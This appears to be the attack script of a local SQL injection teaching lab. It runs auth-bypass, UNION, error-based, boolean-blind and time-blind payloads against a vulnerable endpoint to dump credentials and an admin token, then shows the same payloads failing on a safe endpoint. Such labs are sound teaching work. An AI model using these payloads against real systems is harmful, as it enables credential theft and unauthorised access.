/**
 * Runs each SQL injection technique against the lab and prints the result,
 * then runs the SAME payload against the /safe endpoint to show it blocked.
 *
 * Start the server first (npm run dev), then: npm run attack
 */
const API = process.env.API_URL ?? `http://localhost:${process.env.PORT ?? 8080}`;
const c = (code: number, s: string) => (process.stdout.isTTY ? `\x1b[${code}m${s}\x1b[0m` : s);
const ok = (s: string) => c(32, s);
const bad = (s: string) => c(31, s);
const dim = (s: string) => c(90, s);

async function getJson(path: string) {
  const r = await fetch(`${API}${path}`);
  return r.json() as Promise<any>;
}
async function postJson(path: string, body: unknown) {
  const r = await fetch(`${API}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  return r.json() as Promise<any>;
}
function header(n: number, title: string) {
  console.log(`\n${c(1, `━━━ ${n}. ${title} ━━━`)}`);
}

// ---------------------------------------------------------------- 1. bypass
async function authBypass() {
  header(1, "Authentication bypass  ( ' OR '1'='1' -- )");
  const payload = { username: "' OR '1'='1' -- ", password: "anything" };
  console.log(dim(`payload: username = ${payload.username}`));

  const v = await postJson("/vuln/login", payload);
  console.log(dim(`  vuln SQL: ${v.sql}`));
  console.log(v.loggedIn
    ? bad(`  VULNERABLE: logged in as ${v.user.username} (${v.user.role}) without a password`)
    : ok("  blocked"));

  const s = await postJson("/safe/login", payload);
  console.log(s.loggedIn ? bad("  safe: logged in (!)") : ok("  SAFE: login refused (input treated as a literal username)"));
}

// ----------------------------------------------------------- 2. UNION-based
async function unionBased() {
  header(2, "UNION-based extraction  (dump usernames + passwords)");
  const payload = `zzz' UNION SELECT id, username || ':' || password, 0 FROM users -- `;
  console.log(dim(`payload q = ${payload}`));

  const v = await getJson(`/vuln/products?q=${encodeURIComponent(payload)}`);
  const leaked = (v.results ?? []).filter((r: any) => String(r.name).includes(":"));
  if (leaked.length) {
    console.log(bad("  VULNERABLE: credentials leaked through the product search:"));
    for (const r of leaked) console.log(bad(`      ${r.name}`));
  } else console.log(ok("  blocked"));

  const s = await getJson(`/safe/products?q=${encodeURIComponent(payload)}`);
  console.log((s.results ?? []).length === 0
    ? ok("  SAFE: 0 results (payload matched no product name)")
    : bad(`  safe: ${s.results.length} rows (!)`));
}

// ----------------------------------------------------------- 3. error-based
async function errorBased() {
  header(3, "Error-based extraction  (leak data via a DB error message)");
  const payload = `zzz' OR 1=json_extract('{}',(SELECT api_token FROM users WHERE role='admin')) -- `;
  console.log(dim(`payload q = ${payload}`));

  const v = await getJson(`/vuln/products?q=${encodeURIComponent(payload)}`);
  if (v.error) {
    const token = v.error.match(/tok_[a-z0-9_]+/i);
    console.log(bad(`  VULNERABLE: DB error leaks data -> "${v.error}"`));
    if (token) console.log(bad(`      extracted admin api_token: ${token[0]} (read straight out of the error message)`));
  } else console.log(ok("  no error leaked"));

  const s = await getJson(`/safe/products?q=${encodeURIComponent(payload)}`);
  console.log(s.error && !/tok_/.test(s.error)
    ? ok(`  SAFE: generic error only -> "${s.error}"`)
    : ok("  SAFE: payload treated as a literal search term"));
}

// ---------------------------------------------------- 4a. boolean-based blind
async function booleanBlind() {
  header(4, "Boolean-based blind  (extract the admin password one char at a time)");
  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-!@#$%^&*";
  let recovered = "";
  for (let pos = 1; pos <= 14; pos++) {
    let found = "";
    for (const ch of charset) {
      // ask: is the pos-th char of admin's password == ch ?
      const probe = `3 AND (SELECT substr(password,${pos},1) FROM users WHERE id=3) = '${ch}'`;
      const r = await getJson(`/vuln/user?id=${encodeURIComponent(probe)}`);
      if (r.found) { found = ch; break; }
    }
    if (!found) break;
    recovered += found;
    process.stdout.write(bad(found));
  }
  console.log(bad(`\n  VULNERABLE: recovered admin password = "${recovered}" using only yes/no answers`));

  // same technique against /safe
  const probe = `3 AND (SELECT substr(password,1,1) FROM users WHERE id=3) = 'S'`;
  const r = await getJson(`/safe/user?id=${encodeURIComponent(probe)}`);
  console.log(r.error ? ok(`  SAFE: rejected -> "${r.error}"`) : bad("  safe: accepted (!)"));
}

// ------------------------------------------------------- 4b. time-based blind
async function timeBlind() {
  header(5, "Time-based blind  (infer TRUE/FALSE from response time)");

  const t0 = Date.now();
  await getJson(`/vuln/user?id=${encodeURIComponent("3 AND sleep(2)")}`);
  const slow = Date.now() - t0;
  const t1 = Date.now();
  await getJson(`/vuln/user?id=${encodeURIComponent("3 AND 1=2")}`);
  const fast = Date.now() - t1;
  console.log(dim(`  'AND sleep(2)' took ${slow} ms;  'AND 1=2' took ${fast} ms`));
  console.log(slow > 1500 && fast < 500
    ? bad("  VULNERABLE: the delay confirms the condition — data can be read with no visible output")
    : ok("  no timing difference"));

  const t2 = Date.now();
  const r = await getJson(`/safe/user?id=${encodeURIComponent("3 AND sleep(2)")}`);
  console.log(Date.now() - t2 < 500 && r.error
    ? ok(`  SAFE: rejected instantly -> "${r.error}"`)
    : bad("  safe: delayed (!)"));
}

async function main() {
  console.log(c(1, "SQL INJECTION LAB — attacks vs /vuln, same payloads vs /safe"));
  await authBypass();
  await unionBased();
  await errorBased();
  await booleanBlind();
  await timeBlind();
  console.log(`\n${ok("Done.")} ${dim("Red = attack succeeded on the vulnerable endpoint. Green = blocked on the safe endpoint.")}\n`);
}
main().catch((e) => { console.error(e); process.exit(1); });
